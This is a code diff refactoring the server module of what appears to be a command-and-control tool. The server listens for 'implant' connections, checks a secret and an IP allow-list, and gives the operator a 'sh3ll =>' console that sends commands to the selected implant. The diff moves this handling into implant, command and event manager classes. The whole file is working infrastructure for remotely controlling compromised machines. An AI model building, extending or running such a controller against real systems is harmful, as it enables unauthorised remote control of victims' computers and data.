@@ -1,8 +1,12 @@
 import socket
 import threading
+import errno
 
 from .console import Console
-from .implant import Implant, ImplantsList
+from .implant_manager import ImplantsList, ImplantManager
+from .implant import Implant
+from .command_manager import CommandManager
+from .event_manager import EventManager
 
 
 class Server:
@@ -10,21 +14,33 @@ class Server:
         self.args = args
         self.secret = args.secret
         self.allowed = args.allowed
+        self.quit_event = threading.Event()
+
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.closed = False
 
         self.prompt = "sh3ll => "
-        self.console = Console(self._handle_input, self.prompt)
+        self.console = Console(prompt=self.prompt)
 
-        self.implants = ImplantsList() 
+        self.event_manager = EventManager()
+        self.implant_manager = ImplantManager(
+            event_manager=self.event_manager
+        )
+        self.command_manager = CommandManager(
+            self.console,
+            self.implant_manager,
+            self.event_manager
+        )
 
-        self.current_implant = None
+        self.__register_events()
+
 
     def run(self):
         if self.args.listen:
 
             self.listen_thread = threading.Thread(
-                target=self._listen
+                target=self._listen,
             )
             self.listen_thread.start()
             self.console.run()
@@ -33,9 +49,18 @@ class Server:
 
         self.close()
 
+
     def close(self):
-        if self.socket:
-            self.socket.close()
+        if self.closed:
+            return
+
+        self.closed = True
+
+        for implant in self.implant_manager:
+            implant.close(False)
+
+        self.socket.shutdown(socket.SHUT_RDWR)
+        self.socket.close()
 
         if self.listen_thread:
             self.listen_thread.join()
@@ -43,117 +68,68 @@ class Server:
         if self.console:
             self.console.close()
 
-    def add_implant(self, implant):
-        if not any([i.id == implant.id for i in self.implants]):
-            self.implants.append(implant)
-        
-    def remove_implant(self, implant):
-        implant.close()
-        self.implants.remove(implant)
 
-        if self.current_implant and self.current_implant.id == implant.id:
-            self.current_implant = None
-            self.console.back()
 
     def _listen(self):
         self.socket.bind(("", self.args.port))
         self.socket.listen(5)
 
-
         self.console.write(f"[+] Listening on port {self.args.port}...")
         if self.secret:
             self.console.write(f"[+] Secret key: {self.secret}")
 
-        try:
-            while True:
+        while True:
+            try:
                 conn, addr = self.socket.accept()
                 conn_thread = threading.Thread(
                     target=self._handle_connection, args=(conn, addr),
-                    daemon=True
                 )
                 conn_thread.start()
-        except ConnectionAbortedError:
-            pass
-
+            except socket.timeout:
+                continue
+            except OSError as e:
+                # Handle the case where the socket is closed
+                if e.errno == errno.EBADF:
+                    break
 
     def _handle_connection(self, conn, addr):
-        implant = Implant(self, conn, addr)
+        if self.allowed and addr[0] not in self.allowed:
+            conn.close()
+            self.console.write(
+                f"[-] Connection from {addr[0]}:{addr[1]} not allowed."
+            )
+            return
+
+        implant = Implant(
+            conn, addr, self.args,
+            self.console, self.event_manager
+        )
 
         self.console.write(f"[+] Implant connecting {addr[0]}:{addr[1]}")
         if not implant.authenticate():
-            conn.close()
+            implant.close()
             return
 
         self.console.write(f"[+] Implant connected {addr[0]}:{addr[1]}")
-        self.add_implant(implant)
-        if not self.current_implant:
-            self.select_implant(1)
+
+        self.implant_manager.add_implant(implant)
 
         implant.process()
     
-    def _handle_input(self, text):
-        text = text.strip()
-        system_command = False
-        if text:
-            if text.startswith("/"):
-                text = text[1:]
-                system_command = True
+    def __remove_implant(self, implant):
+        self.implant_manager.remove_implant(implant)
+        current_implant = self.implant_manager.current
 
-        # if no implant selected we can use only system commands 
-        if not self.current_implant and not system_command:
-            self.console.write("[-] No implant selected.")
-            return
+        if current_implant and current_implant.id == implant.id:
+            self.implant_manager.clear_current()
+            self.console.back()
 
-        if system_command:
-            split = text.split(" ")
-            cmd = split[0]
-            args = split[1:]
+        self.console.write(f"[+] Implant {implant.addr} disconnected.")
 
-            if cmd == "exit":
-                if self.current_implant:
-                    self.current_implant.close()
-                else:
-                    self.console.write("[!] Exiting...")
-                    self.close()
-            elif cmd == "help":
-                self.print_help()
-            elif cmd == "list":
-                self.list_implants()
-            elif cmd.startswith("use"):
-                if len(args) != 1:
-                    self.console.write("[-] Usage: use <implant_id>")
-                    return
-                self.select_implant(int(args[0], 1))
-        elif self.current_implant:
-            self.current_implant.send(text + "\n")
-                
-    def print_help(self):
-        s = """
-Available commands:
-    /exit - Exit the program
-    /help - Show this help message
-    /list - List all implants
-    /use <implant_id> - Select an implant to interact with
-        """
-        self.console.write(s)
-    
-    def list_implants(self):
-        if not self.implants:
-            self.console.write("[-] No implants connected.")
-            return
+    def __register_events(self):
+        self.event_manager.register_event("close", self.close)
 
-        for i, implant in enumerate(self.implants):
-            self.console.write(f"[+] Implants: {len(self.implants)}")
-            self.console.write(f"[+] {i + 1}: {implant.addr[0]}:{implant.addr[1]}")
-
-    def select_implant(self, index: int):
-        if not self.implants:
-            self.console.write("[-] No implants connected.")
-            return
-
-        implant = self.implants[index - 1]
-        if implant:
-            self.current_implant = implant
-            self.console.set_prompt(f"[{self.current_implant.addr}] => ")
-        else:
-            self.console.write(f"[-] Implant not found.")
+        # Implant events
+        self.event_manager.register_event(
+            "implant_closed", self.__remove_implant
+        )
